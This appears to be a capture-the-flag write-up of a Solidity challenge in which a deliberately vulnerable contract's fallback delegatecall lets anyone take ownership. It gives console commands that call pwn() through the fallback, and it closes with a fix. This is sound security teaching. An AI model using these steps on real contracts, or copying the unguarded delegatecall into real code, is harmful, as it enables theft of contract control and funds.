**Description**
The goal of this challenge is to claim ownership of the contract below.

* Delegation.sol
```solidity=
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Delegate {

  address public owner;

  constructor(address _owner) {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}
```



**Attack Vector**
The fallback function allows arbitrary code execution by delegating the call to the Delegate contract, without any checks on who the caller is or what the data contains.

```
fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
```
**Attack Scenario**
An attacker could call the Delegation contract’s fallback function with data that contains a call to the `pwn()` function will be executed in the context of the Delegation contract therefore it will change its state.

- First, we can check the current contract owner.
  `Await contract.owner()`

- Let's focus on the function `pwn()` which does the change ownership logic. on the console, we can hash the function name because we'll need it the hash in the next step.
  `var attack = web3.utils.keccak256("pwn()")`
  This will give us the signature(selector) of the function since it does not have any arguments.
- Finally, we can now send a transaction to the contract.
  `contract.sendTransaction({data: attack})`
  This will trigger the fallback function and change the current owner to the new owner. Challenge solved !

**Recommendation**
Add a check to the Delegation contract’s fallback function to make sure that the caller is authorized to call the delegate.